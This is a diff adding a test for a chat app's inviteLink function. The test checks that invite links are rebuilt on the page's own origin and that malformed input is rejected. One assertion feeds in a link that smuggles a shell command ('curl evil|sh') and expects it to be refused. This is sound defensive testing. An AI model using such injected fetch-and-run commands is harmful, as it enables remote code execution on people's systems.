@@ -399,3 +399,12 @@ test("a moderator's unpin holds: the same pin sent again by its pinner is not ta
   await den.applyPin('general', { ...pin, pin: '2'.repeat(16), text: 'a real note' }, false);
   assert.equal((await den.pinsOf('general')).length, 1, 'another pin of theirs is taken');
 });
+
+test("the agent's join command is built from the invite's code alone, on the page's own origin", async () => {
+  const { inviteLink } = await import('../dist/den.js');
+  const O = 'https://den.example';
+  assert.equal(inviteLink('https://den.example/#invite=0a1b2c3d4e5f60718293a4b5c6d7e8f9', O), 'https://den.example/#invite=0a1b2c3d4e5f60718293a4b5c6d7e8f9');
+  assert.equal(inviteLink("https://x/#invite=0a1b'; curl evil|sh; echo '", O), null);
+  assert.equal(inviteLink('https://elsewhere.example/#invite=0a1b2c3d4e5f60718293a4b5c6d7e8f9', O), 'https://den.example/#invite=0a1b2c3d4e5f60718293a4b5c6d7e8f9', 'never another host');
+  assert.equal(inviteLink(null, O), null);
+});
